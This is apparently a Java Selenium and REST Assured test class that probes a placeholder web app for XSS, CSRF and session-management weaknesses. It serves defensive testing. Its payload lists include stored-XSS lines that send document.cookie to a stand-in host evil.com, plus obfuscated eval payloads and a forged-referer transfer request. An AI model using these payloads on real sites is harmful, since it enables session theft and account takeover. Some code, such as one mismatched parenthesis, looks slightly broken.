// Comprehensive Web Application Security Testing

public class WebApplicationSecurityTest {
    private WebDriver driver;
    private String baseUrl;

    @BeforeMethod
    public void setUp() {
        // Use headless browser for security testing
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--headless");
        options.addArguments("--disable-web-security");  // For XSS testing only
        options.addArguments("--allow-running-insecure-content");

        driver = new ChromeDriver(options);
        baseUrl = "https://testapp.example.com";
    }

    // 1. Cross-Site Scripting (XSS) Testing
    @Test
    public void testXSSVulnerabilities() {
        testReflectedXSS();
        testStoredXSS();
        testDOMBasedXSS();
        testXSSInDifferentContexts();
    }

    private void testReflectedXSS() {
        String[] xssPayloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus><option>test</option></select>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>"
        };

        for (String payload : xssPayloads) {
            driver.get(baseUrl + "/search?q=" + URLEncoder.encode(payload, StandardCharsets.UTF_8));

            // Check if XSS payload is reflected without proper encoding
            String pageSource = driver.getPageSource();

            // XSS should be prevented
            assertFalse("XSS payload should be encoded: " + payload, 
                       pageSource.contains("<script>alert('XSS')</script>"));
            assertFalse("XSS payload should be encoded: " + payload,
                       pageSource.contains("onerror=alert('XSS')"));

            // Check for proper HTML entity encoding
            if (payload.contains("<")) {
                assertTrue("< should be encoded as &lt;", 
                          pageSource.contains("&lt;") || !pageSource.contains("<script>"));
            }

            // Verify no JavaScript execution occurred
            try {
                Alert alert = driver.switchTo().alert();
                alert.dismiss();
                fail("XSS vulnerability detected: " + payload);
            } catch (NoAlertPresentException e) {
                // Expected - no alert should be present
            }
        }
    }

    private void testStoredXSS() {
        // Test stored XSS in comment/message functionality
        String[] storedXSSPayloads = {
            "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            "<img src=x onerror=fetch('http://evil.com/log.php?data='+btoa(document.cookie))>",
            "<svg/onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",  // Base64 encoded alert
            "<iframe src=javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))></iframe>"
        };

        // Login first
        loginAsUser("testuser", "password");

        for (String payload : storedXSSPayloads) {
            // Submit malicious comment
            driver.get(baseUrl + "/comments/new");

            WebElement commentField = driver.findElement(By.id("comment"));
            WebElement submitButton = driver.findElement(By.id("submit"));

            commentField.clear();
            commentField.sendKeys(payload);
            submitButton.click();

            // Wait for submission
            WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(5));
            wait.until(ExpectedConditions.presenceOfElementLocated(By.className("comment")));

            // Check if XSS is stored and executed
            String pageSource = driver.getPageSource();

            assertFalse("Stored XSS payload should be sanitized: " + payload,
                       pageSource.contains("<script>"));
            assertFalse("Stored XSS payload should be sanitized: " + payload,
                       pageSource.contains("onerror="));

            // Check for alert execution
            try {
                Alert alert = driver.switchTo().alert();
                alert.dismiss();
                fail("Stored XSS vulnerability detected: " + payload);
            } catch (NoAlertPresentException e) {
                // Expected - no alert should be present
            }
        }
    }

    private void testDOMBasedXSS() {
        // Test DOM-based XSS using URL fragments
        String[] domXSSPayloads = {
            "#<img src=x onerror=alert('DOM-XSS')>",
            "#<script>alert('DOM-XSS')</script>",
            "#javascript:alert('DOM-XSS')"
        };

        for (String payload : domXSSPayloads) {
            driver.get(baseUrl + "/profile" + payload);

            // Execute JavaScript to check DOM manipulation
            JavascriptExecutor js = (JavascriptExecutor) driver;

            // Check if dangerous content was inserted into DOM
            Object result = js.executeScript(
                "return document.documentElement.innerHTML.includes('<script>');"
            );

            assertFalse("DOM-based XSS detected: " + payload, (Boolean) result);

            // Check for alert execution
            try {
                Alert alert = driver.switchTo().alert();
                alert.dismiss();
                fail("DOM-based XSS vulnerability: " + payload);
            } catch (NoAlertPresentException e) {
                // Expected
            }
        }
    }

    private void testXSSInDifferentContexts() {
        // Test XSS in different HTML contexts
        Map<String, String> contextPayloads = Map.of(
            "attribute", "\" onmouseover=alert('XSS') x=\"",
            "javascript", "';alert('XSS');//",
            "css", "</style><script>alert('XSS')</script><style>",
            "url", "javascript:alert('XSS')"
        );

        contextPayloads.forEach((context, payload) -> {
            driver.get(baseUrl + "/test-context?value=" + URLEncoder.encode(payload, StandardCharsets.UTF_8));

            String pageSource = driver.getPageSource();

            // Context-specific validations
            switch (context) {
                case "attribute":
                    assertFalse("Attribute context XSS", pageSource.contains("onmouseover=alert"));
                    break;
                case "javascript":
                    assertFalse("JavaScript context XSS", pageSource.contains("';alert('"));
                    break;
                case "css":
                    assertFalse("CSS context XSS", pageSource.contains("</style><script>"));
                    break;
                case "url":
                    assertFalse("URL context XSS", pageSource.contains("javascript:alert"));
                    break;
            }
        });
    }

    // 2. Cross-Site Request Forgery (CSRF) Testing
    @Test
    public void testCSRFVulnerabilities() {
        testCSRFTokenPresence();
        testCSRFTokenValidation();
        testSameSiteCookieAttributes();
        testRefererHeaderValidation();
    }

    private void testCSRFTokenPresence() {
        loginAsUser("testuser", "password");

        // Check forms for CSRF tokens
        String[] formUrls = {
            "/profile/edit",
            "/settings/password",
            "/transfer",
            "/api/sensitive-action"
        };

        for (String url : formUrls) {
            driver.get(baseUrl + url);

            List<WebElement> forms = driver.findElements(By.tagName("form"));
            for (WebElement form : forms) {
                String method = form.getAttribute("method");

                if ("post".equalsIgnoreCase(method)) {
                    List<WebElement> csrfTokens = form.findElements(
                        By.cssSelector("input[name*='csrf'], input[name*='_token'], input[name*='authenticity_token']"))
                    );

                    assertTrue("CSRF token missing in form at " + url, !csrfTokens.isEmpty());

                    if (!csrfTokens.isEmpty()) {
                        WebElement csrfToken = csrfTokens.get(0);
                        String tokenValue = csrfToken.getAttribute("value");

                        assertNotNull("CSRF token value is null", tokenValue);
                        assertFalse("CSRF token is empty", tokenValue.trim().isEmpty());
                        assertTrue("CSRF token too short", tokenValue.length() > 10);
                    }
                }
            }
        }
    }

    private void testCSRFTokenValidation() {
        loginAsUser("testuser", "password");

        // Get valid CSRF token
        driver.get(baseUrl + "/profile/edit");
        WebElement csrfTokenElement = driver.findElement(By.name("csrf_token"));
        String validToken = csrfTokenElement.getAttribute("value");

        // Test with invalid token
        String invalidToken = "invalid_csrf_token_12345";

        // Submit form with invalid token using REST Assured
        String sessionCookie = driver.manage().getCookieNamed("JSESSIONID").getValue();

        Response response = given()
            .cookie("JSESSIONID", sessionCookie)
            .formParam("name", "Modified Name")
            .formParam("csrf_token", invalidToken)
            .when()
            .post(baseUrl + "/profile/update")
            .then()
            .extract().response();

        // Should reject invalid CSRF token
        assertEquals(403, response.getStatusCode());
        assertTrue(response.body().asString().toLowerCase().contains("csrf"));

        // Test with valid token (should succeed)
        response = given()
            .cookie("JSESSIONID", sessionCookie)
            .formParam("name", "Valid Name Change")
            .formParam("csrf_token", validToken)
            .when()
            .post(baseUrl + "/profile/update")
            .then()
            .extract().response();

        assertEquals(200, response.getStatusCode());
    }

    private void testSameSiteCookieAttributes() {
        // Check cookie security attributes
        driver.get(baseUrl);

        Set<Cookie> cookies = driver.manage().getCookies();

        for (Cookie cookie : cookies) {
            if (cookie.getName().toLowerCase().contains("session") || 
                cookie.getName().toLowerCase().contains("auth")) {

                // Use REST Assured to check detailed cookie attributes
                Response response = given()
                    .when()
                    .get(baseUrl)
                    .then()
                    .extract().response();

                String setCookieHeader = response.getHeader("Set-Cookie");

                if (setCookieHeader != null && setCookieHeader.contains(cookie.getName())) {
                    assertTrue("Session cookie should have HttpOnly flag", 
                              setCookieHeader.toLowerCase().contains("httponly"));
                    assertTrue("Session cookie should have Secure flag for HTTPS", 
                              setCookieHeader.toLowerCase().contains("secure") || !baseUrl.startsWith("https"));
                    assertTrue("Session cookie should have SameSite attribute", 
                              setCookieHeader.toLowerCase().contains("samesite"));
                }
            }
        }
    }

    private void testRefererHeaderValidation() {
        loginAsUser("testuser", "password");
        String sessionCookie = driver.manage().getCookieNamed("JSESSIONID").getValue();

        // Test with malicious referer
        Response response = given()
            .cookie("JSESSIONID", sessionCookie)
            .header("Referer", "https://evil.com/malicious-page")
            .formParam("amount", "1000")
            .formParam("account", "attacker-account")
            .when()
            .post(baseUrl + "/transfer")
            .then()
            .extract().response();

        // Should validate referer header
        assertNotEquals(200, response.getStatusCode());
    }

    // 3. Session Management Security Testing
    @Test
    public void testSessionManagementSecurity() {
        testSessionFixation();
        testSessionHijacking();
        testSessionTimeout();
        testConcurrentSessions();
    }

    private void testSessionFixation() {
        // Get session ID before authentication
        driver.get(baseUrl);
        Cookie sessionCookieBefore = driver.manage().getCookieNamed("JSESSIONID");
        String sessionIdBefore = sessionCookieBefore != null ? sessionCookieBefore.getValue() : null;

        // Login
        loginAsUser("testuser", "password");

        // Get session ID after authentication
        Cookie sessionCookieAfter = driver.manage().getCookieNamed("JSESSIONID");
        String sessionIdAfter = sessionCookieAfter != null ? sessionCookieAfter.getValue() : null;

        // Session ID should change after login to prevent session fixation
        assertNotEquals("Session ID should change after login", sessionIdBefore, sessionIdAfter);
    }

    private void testSessionHijacking() {
        // Login and get session
        loginAsUser("testuser", "password");
        String validSessionId = driver.manage().getCookieNamed("JSESSIONID").getValue();

        // Test if session can be used from different user agent
        Response response = given()
            .cookie("JSESSIONID", validSessionId)
            .header("User-Agent", "DifferentBrowser/1.0")
            .when()
            .get(baseUrl + "/profile")
            .then()
            .extract().response();

        // Some applications may implement user-agent validation
        // This test checks if the session is still valid with different user-agent
        if (response.getStatusCode() == 401) {
            System.out.println("Good: User-agent validation implemented");
        }

        // Test session reuse with different IP (if possible in test environment)
        // This would require proxy or network configuration
    }

    private void testSessionTimeout() {
        loginAsUser("testuser", "password");
        String sessionId = driver.manage().getCookieNamed("JSESSIONID").getValue();

        // Wait for session timeout (or simulate it)
        // In real test, you might need to configure short timeout
        try {
            Thread.sleep(30000); // 30 seconds - adjust based on app timeout
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        // Try to access protected resource
        Response response = given()
            .cookie("JSESSIONID", sessionId)
            .when()
            .get(baseUrl + "/profile")
            .then()
            .extract().response();

        // Should redirect to login or return 401 if session expired
        assertTrue("Session should expire", 
                  response.getStatusCode() == 401 || 
                  response.getStatusCode() == 302 || 
                  response.body().asString().contains("login"));
    }

    private void testConcurrentSessions() {
        // Login with first session
        loginAsUser("testuser", "password");
        String firstSessionId = driver.manage().getCookieNamed("JSESSIONID").getValue();

        // Login with second session (new browser instance would be ideal)
        WebDriver secondDriver = new ChromeDriver();
        try {
            secondDriver.get(baseUrl + "/login");
            secondDriver.findElement(By.name("username")).sendKeys("testuser");
            secondDriver.findElement(By.name("password")).sendKeys("password");
            secondDriver.findElement(By.cssSelector("input[type='submit']")).click();

            String secondSessionId = secondDriver.manage().getCookieNamed("JSESSIONID").getValue();

            // Test if first session is still valid
            Response response = given()
                .cookie("JSESSIONID", firstSessionId)
                .when()
                .get(baseUrl + "/profile")
                .then()
                .extract().response();

            // Check application's concurrent session policy
            if (response.getStatusCode() == 401) {
                System.out.println("Single session policy enforced");
            } else {
                System.out.println("Multiple concurrent sessions allowed");
            }
        } finally {
            secondDriver.quit();
        }
    }

    // Helper methods
    private void loginAsUser(String username, String password) {
        driver.get(baseUrl + "/login");

        WebElement usernameField = driver.findElement(By.name("username"));
        WebElement passwordField = driver.findElement(By.name("password"));
        WebElement loginButton = driver.findElement(By.cssSelector("input[type='submit'], button[type='submit']"));

        usernameField.clear();
        usernameField.sendKeys(username);
        passwordField.clear();
        passwordField.sendKeys(password);
        loginButton.click();

        // Wait for login to complete
        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.or(
            ExpectedConditions.urlContains("dashboard"),
            ExpectedConditions.urlContains("profile"),
            ExpectedConditions.presenceOfElementLocated(By.className("logout"))
        ));
    }

